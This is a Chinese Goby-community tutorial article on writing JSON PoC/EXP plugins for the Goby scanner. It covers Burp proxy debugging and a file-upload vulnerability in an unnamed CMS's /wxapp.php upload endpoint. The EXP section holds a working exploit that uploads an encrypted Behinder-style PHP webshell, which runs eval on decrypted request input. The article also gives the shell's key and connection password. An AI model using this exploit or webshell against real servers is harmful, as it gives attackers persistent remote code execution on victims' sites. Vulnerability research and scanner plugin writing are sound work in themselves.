> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IeftOSV29DbDgeClqXqnkg)

![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif)  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJe8ZbNbOBHxDAibjyZ5fkxsL1GMTB3rPd8qRlYwGOYPFTP6pSMB5gJ1Vw/640?wx_fmt=png)

Goby 社区第 14 篇技术分享文章

全文共：5914 字   预计阅读时间：15 分钟

**前言：**这几天师傅们都在提交 Goby 的 EXP，赶鸭子上架，一边研究一边写，也写出来几个，编写过程中遇到了很多问题，都记录了下来。这篇文章主要讲一些遇到过的坑及调试的问题，再通过一个文件上传类 PoC/EXP 来详细讲解。因为我也是刚刚学习编写，如果文章中的说法有什么问题请师傅们及时指出。我使用的版本是 goby-win-x64-1.8.275，PoC 使用 json 编写。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **01**  

 **一些调试遇到的问题**

**1.1** **通过 Burp 代理获取 Goby 流量进行调试**

在扫描设置中设置 Burp 的代理。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeyKs1FEffIiaDzroCI5UZBMPOgw23K3S8W0gKQxElC40CFPib5b0cZicPQ/640?wx_fmt=png)

在设置完代理后最好重启一下，之后点击新建扫描 -> 开始

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJedGHu6KNfzxl6Z8Ya6Ip9o7x5WzF6ZVTTqwmlwzSRWkc2DlJ7zRiahzw/640?wx_fmt=png)

Burp 中就可以抓到包了。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJe1WNoHcCmuXg6M6Qiavarh5ibjwwpK6vOCWRkLQh9AQbLdZPzosOsKxPA/640?wx_fmt=png)

**注意：设置代理后有个小问题，就是开始扫描后抓不到 POC 验证的流量，主要是因为开启扫描后 Goby 先进行端口、协议和资产的识别，再进行漏洞探测。所以这里扫描的话建议设置 Burp 为 Intercept is off ，因为本身我们需要抓取的是 PoC 的流量，这里扫描的流量就看个人需求了。**（这里测试的只是 Burp 的代理，我用的版本是 1.6 的，至于其他的代理或者 Burp 版本还未测试）

扫描结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJewQ9CP3yHc5tyok83VsjJzSz8Q5H7T3hTGHBVA76LILWdZ11YyxJYzg/640?wx_fmt=png)

这时候要看 PoC 的流量在修改 PoC 中有一个单 ip 扫描，这里可以抓到 PoC 的流量

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeicRolf01wSgpgIb2DOaaJgVcwfLDWcRibvyU7EYp4WoibTVicfdic5AbV9A/640?wx_fmt=png)

可以看到已经拦截到流量了

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJe6jY0P9HibyCXfo4Dvfc8J8icAYbmOXOObB4CXOgDcDHXwJuicRgEmUKxw/640?wx_fmt=png)

**注意：这里也有个小问题，就是如果在 PoC 管理中测试，必须先新建立扫描任务扫完后再去 PoC 管理中测试，Burp 才可以抓到包。**

还有个小技巧，通常修改完 PoC 后需要重启一下 Goby，如果想要快速调试 PoC 包并观察流量，修改完后可以点击返回到 PoC 管理页面再点击进来.

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJegYbhd2bNzsG3JVVGMdPiafZj667sWWBGvxtia7e9eVb4RIwQicegwp03A/640?wx_fmt=png)

可以看到流量中明显变化了。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJezbU2BCcwYMgYOfqiaBZmWtzFS09OtfQnia0JuHeibY85nZE7yZ7nyEC1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeBuhNk04euJ3cyPHNcQBHmG3icWQr46NeibPAXz9qSPbkibGvfTCpicrKBA/640?wx_fmt=png)

**1.2 识别规则并调用 PoC**  

经过测试发现 Goby 的 PoC 调用规则是先通过 PoC 写的查询规则去查询，如果查询到才会调用 PoC 进行扫描，否则就算你勾选了 PoC 也不会进行调用。具体得查询规则可以查看 Goby 查询语法

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeNg6yUHIPdNj3nyVrFewM2tpuV20gBzibiczXibE6EVOO2Z0ibL3aYBXKVw/640?wx_fmt=png)

这里就可以发现有时候通过 PoC 管理手动测试的漏洞可以验证成功，而通过扫描的地址无法检测到存在漏洞。

**注意：有时候一些 CMS 需要自己定义一些规则，比如 body="this is test" || title="管理登录" 之类的，有时候会发现直接扫描域名无法匹配到其规则，如果扫描 IP 则会匹配到。**

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **02**

**编写文件上传类 PoC 及 EXP  
**

接下来通过一个文件上传类的 PoC/EXP 来讲解一下编写过程中遇到的问题。文件上传的 PoC 规则是需要上传一个输出特定信息并且自删除的脚本。如：

```
<?php echo md5(233);unlink(__FILE__);?>
```

这样的话我们需要在 PoC 处发送两次请求，第一次进行上传文件操作，第二次对上传的文件进行访问并验证，在访问之后这个文件会自动删除。

下面贴出请求代码，讲解我通过代码块写出。

```
"ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/wxapp.php?controller=Goods.doPageUpload",
        "follow_redirect": false,
        //header头的设置,这里最好还是通过Burp抓包把请求头写入防止请求出错
        "header": {
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
        },
        "data_type": "text",
        //post数据可以从Burp中直接复制,通过Goby的图形化界面直接复制进去,这里会自动生成
        "data": "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\nContent-Type: image/gif\n\n<?php echo md5(233);unlink(__FILE__);?>\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "image_o",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        //这里需要设置两个变量,通过正则匹配返回，为上传文件的路径
        "urlDir|lastbody|regex|image_o\":\".*goods\\\\/(.*?)\\\\/.*\"",
        "urlDir2|lastbody|regex|image_o\":\".*goods\\\\/.*\\\\/(.*?)\""
      ]
    },
    {
      "Request": {
        "method": "GET",
        //这里调用上面的两个变量去发送GET请求
        "uri": "/Uploads/image/goods/{{{urlDir}}}/{{{urlDir2}}}",
        "follow_redirect": false,
        "header": {
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1"
        },
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "e165421110ba03099a1c0393373c5b43",//判断页面是否有该md5值
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
```

这里需要说一下下面的两句正则

```
"urlDir|lastbody|regex|image_o\":\".*goods\\\\/(.*?)\\\\/.*\"",
"urlDir2|lastbody|regex|image_o\":\".*goods\\\\/.*\\\\/(.*?)\""
```

因为输出的文件地址是 \/\/Uploads\/image\/goods\/2021-05-27\/0206254881620132.php 这样子的

如果写成这样

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJe1dia5p8CmDvFibaSEwrlvcmmPc45ECrov9bySnKnX1CybuXribEw4icZjg/640?wx_fmt=png)

直接调用发送 GET 请求为 %5C/image%5C/goods%5C/2021-05-27%5C/0206254881620132.php

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeBPPgpdmohfp9ZY2ibrSLAN4FFovFT6n6Zl0NYN2Gumicx14lApPDFxsA/640?wx_fmt=png)

这种请求会返回 404

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeaV7B78FbVqGfZiaCQWw4QUKbVc0NHYm63tXgYWo0Aib1JiaYxS0XYwKYA/640?wx_fmt=png)

所以必须将 \ 去掉，已知文件的路径除了最后的上传日期和文件名在变化，其他不变，所以前面路径可以写死，通过正则取到日期和文件名进行组合请求。

**注意：如果使用 json 编写，\ 这里必须通过两个 \\ 匹配，否则匹配不到**

"urlDir|lastbody|regex|image_o\":\".*goods\\\\/(.*?)\\\\/.*\"" 取出日期，结果为 2021-05-27

"urlDir2|lastbody|regex|image_o\":\".*goods\\\\/.*\\\\/(.*?)\"" 取出文件名 结果为 0206254881620132.php 

然后通过 "uri": "/Uploads/image/goods/{{{urlDir}}}/{{{urlDir2}}}" 请求则返回成功

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJegFEHE3y9gAdgOfXF8Alic9cxtXCFzD1L8eyWSNV2Xwp8AAvRp5xZ35w/640?wx_fmt=png)

PoC 部分写完，接下来看 EXP 部分就比较简单了，

```
"ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/wxapp.php?controller=Goods.doPageUpload",
        "follow_redirect": false,
        "header": {
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
        },
        "data_type": "text",
        "data": "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"shell.php\"\nContent-Type: image/gif\n\n<?php\n@error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post, \"AES128\", $key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p.\"\");}}@call_user_func(new C(),$params);\n?>\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "image_o",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody|regex|image_o\":\"(.*?)\""
      ]
    }
  ],
```

直接上传 shell，这里的 data 数据还是通过 Burp 直接复制即可，通过 Goby 的图形化界面复制进去会自动生成换行符之类的，Exploit 部分可以先将数据通过 PoC 部分的图形化界面生成再复制进下面 Exploit 的 json 中。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJeq7Q60YiaQicfHMEspOgpIa4ozWP9VTQCvGWOmjLBhibyKSslwwAL9c6pg/640?wx_fmt=png)下方为测试截图

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjJGCZtiaUyOJNokHYmjjMyJerWRUfuyibebsialTBlUibKsm0oqs0OiaU0Oj22SSaVWVSMKDTia8wRkdiapg/640?wx_fmt=png)

这里因为需要输出 shell 地址和连接方式，并且要去掉 \，这样的话就需要变量或者字符串拼接... 一直没测试成功，就通过 expParams 设置了一下显示信息...

```
"ExpParams": [
    {
      "name": "webshellinfo",
      "type": "textarea",
      "value": "Using Behinder_v3.0 connection, password is rebeyond",
      "show": ""
    }
  ],
```

但是这样是不合规的 - -，因为 ExpParams 不是当做输出信息来用的，而是为了给 EXP 传参用的。最后问了 Goby 的师傅说目前使用 json 编写要想在 output 处实现这样的需求是不行的，想要实现的话只能使用 go 来编写了。  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **03**

**总结**

-.- 编写过程中还是遇到了很多问题，大部分算是解决了，当然一些需求还是需要用 go 写，希望能帮助还不会 go 语言的小伙伴们通过 json 去编写 PoC/EXP。最后感谢师傅们的指导~~~

  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWfiaAtUngV8rgLh0bIibv9SumD1Y9ZmphGxK9lKiakkOWDp2gRsLjZInPg/640?wx_fmt=png)

**最新 Goby 使用技巧分享****：**

[•](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247491982&idx=1&sn=32af9069f2cc46ca4e976949bf59fb9b&chksm=eb840a2edcf38338aa47e684a294e3adb420fa79c1fbabe890344ab6d04f1e9fbb71a6d1824e&scene=21#wechat_redirect)  [梦幻的彼岸 | Apache Tomcat 样例目录 session](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247492779&idx=1&sn=ad21953a1500e9faf108d35af59670d0&chksm=eb840f0bdcf3861da0ca6127182c49fe861d222ee4bf76207c9f881b4f212e0ca147b88fda98&scene=21#wechat_redirect)

[• kio | 如何利用 Goby 将防守单位打出局](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247493346&idx=1&sn=15aee6f7fb0730d102f2a99544be2993&chksm=eb840d42dcf384545f637905e7f875d32a129f54aa3fdef1892abba961a360b9a20fb5f5ffaf&scene=21#wechat_redirect)

[• bytesec | 从致远 OA-ajax.do 漏洞复现到利用](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247493690&idx=1&sn=b1ddaa1b3ca1004cf3bf336f8f4c2eb4&chksm=eb84039adcf38a8c012a29829cda76766bb925bd6a0d80687bc43b597f70f64046158fe0ca41&scene=21#wechat_redirect)

[• zzlyzq | 利用 Goby 发现企业云网络中的安全隐患](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247495973&idx=1&sn=45fbd8de0e1377d2912d5f9c808bbb03&chksm=eb841a85dcf393933fcbc6e5d718c91355ad274cd0ae1ce634e6b4ab94037fa1218fa5b4f4bb&scene=21#wechat_redirect)

[• zhzyker | 如何编写合格的 PoC 领取 Goby 红队专版](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247500193&idx=1&sn=217ab617e2160f99aa2cd43f4511f4ab&chksm=eb842a01dcf3a317186bacce650fa231a109a805a8778fcd4b3a2379a3dbcea5adcfc92af7da&scene=21#wechat_redirect)

更多 >>  打野手册

如果表哥 / 表姐也想把自己上交给社区（Goby 介绍 / 扫描 / 口令爆破 / 漏洞利用 / 插件开发 / PoC 编写等文章均可）![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKEYyZh6YMicl2K5TDD26xJiaXMwReBoEFfWYSRkOGBMzrZ3VpbKu1DtFLprCibCrsuX3QlGJLMG79jg/640?wx_fmt=png)，欢迎投稿到我们公众号，红队专版等着你们~~~

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIaeEP9ZkuBRxk7BicMlGFoEZnkVh7ib8GaBYw8lrh8SqACnTUZXlXclC9ZRfOFuvB3gTWHOPvH8icyg/640?wx_fmt=png)